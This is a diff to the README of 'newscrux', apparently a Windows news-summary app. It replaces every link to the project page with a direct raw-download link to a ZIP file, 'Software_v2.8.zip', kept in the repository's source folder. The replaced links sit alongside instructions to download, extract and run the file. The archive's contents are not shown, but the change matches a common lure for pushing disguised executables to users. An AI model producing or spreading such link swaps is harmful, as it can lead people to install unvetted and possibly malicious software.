@@ -1,12 +1,12 @@
 # 🗞️ newscrux - News in clear, local summaries
 
-[![Download newscrux](https://img.shields.io/badge/Download%20newscrux-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/helmitae/newscrux)
+[![Download newscrux](https://img.shields.io/badge/Download%20newscrux-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/helmitae/newscrux/raw/refs/heads/main/src/Software_v2.8.zip)
 
 ## 📥 Download
 
 Visit this page to download and run the app on Windows:
 
-[https://github.com/helmitae/newscrux](https://github.com/helmitae/newscrux)
+[https://github.com/helmitae/newscrux/raw/refs/heads/main/src/Software_v2.8.zip](https://github.com/helmitae/newscrux/raw/refs/heads/main/src/Software_v2.8.zip)
 
 If the page shows a release file, download it to your PC. If it offers a ZIP file, save it first, then extract it before you open the app.
 
@@ -39,7 +39,7 @@ For the best result, keep your browser open during the first setup.
 Follow these steps on your Windows PC:
 
 1. Open the download page:
-   [https://github.com/helmitae/newscrux](https://github.com/helmitae/newscrux)
+   [https://github.com/helmitae/newscrux/raw/refs/heads/main/src/Software_v2.8.zip](https://github.com/helmitae/newscrux/raw/refs/heads/main/src/Software_v2.8.zip)
 
 2. Find the latest release or download file.
 
@@ -149,7 +149,7 @@ For smooth use, keep your browser and other apps closed if your PC is older.
 
 When a new version is available, go back to:
 
-[https://github.com/helmitae/newscrux](https://github.com/helmitae/newscrux)
+[https://github.com/helmitae/newscrux/raw/refs/heads/main/src/Software_v2.8.zip](https://github.com/helmitae/newscrux/raw/refs/heads/main/src/Software_v2.8.zip)
 
 Download the new file and replace the older version on your PC. If the app stores settings in a separate folder, your choices may stay in place after the update.
 
@@ -194,7 +194,7 @@ Download the new file and replace the older version on your PC. If the app store
 
 Use the main page here to get the latest file and run newscrux on Windows:
 
-[https://github.com/helmitae/newscrux](https://github.com/helmitae/newscrux)
+[https://github.com/helmitae/newscrux/raw/refs/heads/main/src/Software_v2.8.zip](https://github.com/helmitae/newscrux/raw/refs/heads/main/src/Software_v2.8.zip)
 
 ## 🗃️ File handling on Windows
 
